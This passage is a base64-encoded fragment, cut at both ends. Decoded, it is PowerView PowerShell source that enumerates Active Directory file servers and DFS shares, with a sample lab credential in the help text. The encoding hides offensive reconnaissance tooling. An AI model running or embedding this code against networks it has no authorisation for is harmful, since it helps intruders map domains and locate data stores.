vdXBNZW1iZXJdIFJlbW92aW5nIG1lbWJlciAnJE1lbWJlcicgZnJvbSBncm91cCAnJElkZW50aXR5JyIKICAgICAgICAgICAgICAgICRNZW1iZXIgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbF06OkZpbmRCeUlkZW50aXR5KCRVc2VyQ29udGV4dC5Db250ZXh0LCAkVXNlcklkZW50aXR5KQogICAgICAgICAgICAgICAgJEdyb3VwLk1lbWJlcnMuUmVtb3ZlKCRNZW1iZXIpCiAgICAgICAgICAgICAgICAkR3JvdXAuU2F2ZSgpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluRmlsZVNlcnZlciB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyBhIGxpc3Qgb2Ygc2VydmVycyBsaWtlbHkgZnVuY3Rpb25pbmcgYXMgZmlsZSBzZXJ2ZXJzLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIgIAoKLkRFU0NSSVBUSU9OCgpSZXR1cm5zIGEgbGlzdCBvZiBsaWtlbHkgZmlsZXNlcnZlcnMgYnkgc2VhcmNoaW5nIGZvciBhbGwgdXNlcnMgaW4gQWN0aXZlIERpcmVjdG9yeQp3aXRoIG5vbi1udWxsIGhvbWVkaXJlY3RvcnksIHNjcmlwdHBhdGgsIG9yIHByb2ZpbGVwYXRoIGZpZWxkcywgYW5kIGV4dHJhY3RpbmcvdW5pcXVpZnlpbmcKdGhlIHNlcnZlciBuYW1lcy4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5GaWxlU2VydmVyCgpSZXR1cm5zIGFjdGl2ZSBmaWxlIHNlcnZlcnMgZm9yIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluRmlsZVNlcnZlciAtRG9tYWluIHRlc3RpbmcubG9jYWwKClJldHVybnMgYWN0aXZlIGZpbGUgc2VydmVycyBmb3IgdGhlICd0ZXN0aW5nLmxvY2FsJyBkb21haW4uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpbkZpbGVTZXJ2ZXIgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpTdHJpbmcKCk9uZSBvciBtb3JlIHN0cmluZ3MgcmVwcmVzZW50aW5nIGZpbGUgc2VydmVyIG5hbWVzLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3RyaW5nXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlciggVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluTmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgIGZ1bmN0aW9uIFNwbGl0LVBhdGggewogICAgICAgICAgICAjIHNob3J0IGludGVybmFsIGhlbHBlciB0byBzcGxpdCBVTkMgc2VydmVyIHBhdGhzCiAgICAgICAgICAgIFBhcmFtKFtTdHJpbmddJFBhdGgpCgogICAgICAgICAgICBpZiAoJFBhdGggLWFuZCAoJFBhdGguc3BsaXQoJ1xcJykuQ291bnQgLWdlIDMpKSB7CiAgICAgICAgICAgICAgICAkVGVtcCA9ICRQYXRoLnNwbGl0KCdcXCcpWzJdCiAgICAgICAgICAgICAgICBpZiAoJFRlbXAgLWFuZCAoJFRlbXAgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICRUZW1wCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdMREFQRmlsdGVyJyA9ICcoJihzYW1BY2NvdW50VHlwZT04MDUzMDYzNjgpKCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIpKSh8KGhvbWVkaXJlY3Rvcnk9Kikoc2NyaXB0cGF0aD0qKShwcm9maWxlcGF0aD0qKSkpJwogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnaG9tZWRpcmVjdG9yeSxzY3JpcHRwYXRoLHByb2ZpbGVwYXRoJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldERvbWFpbiBpbiAkRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFRhcmdldERvbWFpbgogICAgICAgICAgICAgICAgJFVzZXJTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICMgZ2V0IGFsbCByZXN1bHRzIHcvbyB0aGUgcGlwZWxpbmUgYW5kIHVuaXF1aWZ5IHRoZW0gKEkga25vdyBpdCdzIG5vdCBwcmV0dHkpCiAgICAgICAgICAgICAgICAkKEZvckVhY2goJFVzZXJSZXN1bHQgaW4gJFVzZXJTZWFyY2hlci5GaW5kQWxsKCkpIHtpZiAoJFVzZXJSZXN1bHQuUHJvcGVydGllc1snaG9tZWRpcmVjdG9yeSddKSB7U3BsaXQtUGF0aCgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydob21lZGlyZWN0b3J5J10pfWlmICgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydzY3JpcHRwYXRoJ10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3NjcmlwdHBhdGgnXSl9aWYgKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3Byb2ZpbGVwYXRoJ10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3Byb2ZpbGVwYXRoJ10pfX0pIHwgU29ydC1PYmplY3QgLVVuaXF1ZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVXNlclNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAkKEZvckVhY2goJFVzZXJSZXN1bHQgaW4gJFVzZXJTZWFyY2hlci5GaW5kQWxsKCkpIHtpZiAoJFVzZXJSZXN1bHQuUHJvcGVydGllc1snaG9tZWRpcmVjdG9yeSddKSB7U3BsaXQtUGF0aCgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydob21lZGlyZWN0b3J5J10pfWlmICgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydzY3JpcHRwYXRoJ10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3NjcmlwdHBhdGgnXSl9aWYgKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3Byb2ZpbGVwYXRoJ10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3Byb2ZpbGVwYXRoJ10pfX0pIHwgU29ydC1PYmplY3QgLVVuaXF1ZQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5ERlNTaGFyZSB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyBhIGxpc3Qgb2YgYWxsIGZhdWx0LXRvbGVyYW50IGRpc3RyaWJ1dGVkIGZpbGUgc3lzdGVtcwpmb3IgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWlucy4KCkF1dGhvcjogQmVuIENhbXBiZWxsIChAbWVhdGJhbGxzX18pICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHNlYXJjaGVzIGZvciBhbGwgZGlzdHJpYnV0ZWQgZmlsZSBzeXN0ZW1zIChlaXRoZXIgdmVyc2lvbgoxLCAyLCBvciBib3RoIGRlcGVuZGluZyBvbiAtVmVyc2lvbiBYKSBieSBzZWFyY2hpbmcgZm9yIGRvbWFpbiBvYmplY3RzCm1hdGNoaW5nIChvYmplY3RDbGFzcz1mVERmcykgb3IgKG9iamVjdENsYXNzPW1zREZTLUxpbmt2MiksIHJlc3BlY3RpdmVseQpUaGUgc2VydmVyIGRhdGEgaXMgcGFyc2VkIGFwcHJvcHJpYXRlbHkgYW5kIHJldHVybmVkLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWlucyB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluREZTU2hhcmUKClJldHVybnMgYWxsIGRpc3RyaWJ1dGVkIGZpbGUgc3lzdGVtIHNoYXJlcyBmb3IgdGhlIGN1cnJlbnQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5ERlNTaGFyZSAtRG9tYWluIHRlc3RsYWIubG9jYWwKClJldHVybnMgYWxsIGRpc3RyaWJ1dGVkIGZpbGUgc3lzdGVtIHNoYXJlcyBmb3IgdGhlICd0ZXN0bGFiLmxvY2FsJyBkb21haW4uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpbkRGU1NoYXJlIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0N1c3RvbU9iamVjdAoKQSBjdXN0b20gUFNPYmplY3QgZGVzY3JpYmluZyB0aGUgZGlzdHJpYnV0ZWQgZmlsZSBzeXN0ZW1zLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlQXBwcm92ZWRWZXJicycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3VzdG9tT2JqZWN0JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlciggVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluTmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQWxsJywgJ1YxJywgJzEnLCAnVjInLCAnMicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFZlcnNpb24gPSAnQWxsJwogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgIGZ1bmN0aW9uIFBhcnNlLVBrdCB7CiAgICAgICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgICAgIFBhcmFtKAogICAgICAgICAgICAgICAgW0J5dGVbXV0KICAgICAgICAgICAgICAgICRQa3QKICAgICAgICAgICAgKQoKICAgICAgICAgICAgJGJpbiA9ICRQa3QKICAgICAgICAgICAgJGJsb2JfdmVyc2lvbiA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQzMigkYmluWzAuLjNdLDApCiAgICAgICAgICAgICRibG9iX2VsZW1lbnRfY291bnQgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGJpbls0Li43XSwwKQogICAgICAgICAgICAkb2Zmc2V0ID0gOAogICAgICAgICAgICAjaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9jYzIyNzE0Ny5hc3B4CiAgICAgICAgICAgICRvYmplY3RfbGlzdCA9IEAoKQogICAgICAgICAgICBmb3IoJGk9MTsgJGkgLWxlICRibG9iX2VsZW1lbnRfY291bnQ7ICRpKyspewogICAgICAgICAgICAgICAgJGJsb2JfbmFtZV9zaXplX3N0YXJ0ID0gJG9mZnNldAogICAgICAgICAgICAgICAgJGJsb2JfbmFtZV9zaXplX2VuZCA9ICRvZmZzZXQgKyAxCiAgICAgICAgICAgICAgICAkYmxvYl9uYW1lX3NpemUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MTYoJGJpblskYmxvYl9uYW1lX3NpemVfc3RhcnQuLiRibG9iX25hbWVfc2l6ZV9lbmRdLDApCgogICAgICAgICAgICAgICAgJGJsb2JfbmFtZV9zdGFydCA9ICRibG9iX25hbWVfc2l6ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAkYmxvYl9uYW1lX2VuZCA9ICRibG9iX25hbWVfc3RhcnQgKyAkYmxvYl9uYW1lX3NpemUgLSAxCiAgICAgICAgICAgICAgICAkYmxvYl9uYW1lID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGJpblskYmxvYl9uYW1lX3N0YXJ0Li4kYmxvYl9uYW1lX2VuZF0pCgogICAgICAgICAgICAgICAgJGJsb2JfZGF0YV9zaXplX3N0YXJ0ID0gJGJsb2JfbmFtZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAkYmxvYl9kYXRhX3NpemVfZW5kID0gJGJsb2JfZGF0YV9zaXplX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgJGJsb2JfZGF0YV9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRiaW5bJGJsb2JfZGF0YV9zaXplX3N0YXJ0Li4kYmxvYl9kYXRhX3NpemVfZW5kXSwwKQoKICAgICAgICAgICAgICAgICRibG9iX2RhdGFfc3RhcnQgPSAkYmxvYl9kYXRhX3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgJGJsb2JfZGF0YV9lbmQgPSAkYmxvYl9kYXRhX3N0YXJ0ICsgJGJsb2JfZGF0YV9zaXplIC0gMQogICAgICAgICAgICAgICAgJGJsb2JfZGF0YSA9ICRiaW5bJGJsb2JfZGF0YV9zdGFydC4uJGJsb2JfZGF0YV9lbmRdCiAgICAgICAgICAgICAgICBzd2l0Y2ggLXdpbGRjYXJkICgkYmxvYl9uYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgIlxzaXRlcm9vdCIgeyAgfQogICAgICAgICAgICAgICAgICAgICJcZG9tYWlucm9vdCoiIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBQYXJzZSBERlNOYW1lc3BhY2VSb290T3JMaW5rQmxvYiBvYmplY3QuIFN0YXJ0cyB3aXRoIHZhcmlhYmxlIGxlbmd0aCBERlNSb290T3JMaW5rSURCbG9iIHdoaWNoIHdlIHBhcnNlIGZpcnN0Li4uCiAgICAgICAgICAgICAgICAgICAgICAgICMgREZTUm9vdE9yTGlua0lEQmxvYgogICAgICAgICAgICAgICAgICAgICAgICAkcm9vdF9vcl9saW5rX2d1aWRfc3RhcnQgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRyb290X29yX2xpbmtfZ3VpZF9lbmQgPSAxNQogICAgICAgICAgICAgICAgICAgICAgICAkcm9vdF9vcl9saW5rX2d1aWQgPSBbYnl0ZVtdXSRibG9iX2RhdGFbJHJvb3Rfb3JfbGlua19ndWlkX3N0YXJ0Li4kcm9vdF9vcl9saW5rX2d1aWRfZW5kXQogICAgICAgICAgICAgICAgICAgICAgICAkZ3VpZCA9IE5ldy1PYmplY3QgR3VpZCgsJHJvb3Rfb3JfbGlua19ndWlkKSAjIHNob3VsZCBtYXRjaCAkZ3VpZF9zdHIKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF9zaXplX3N0YXJ0ID0gJHJvb3Rfb3JfbGlua19ndWlkX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF9zaXplX2VuZCA9ICRwcmVmaXhfc2l6ZV9zdGFydCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDE2KCRi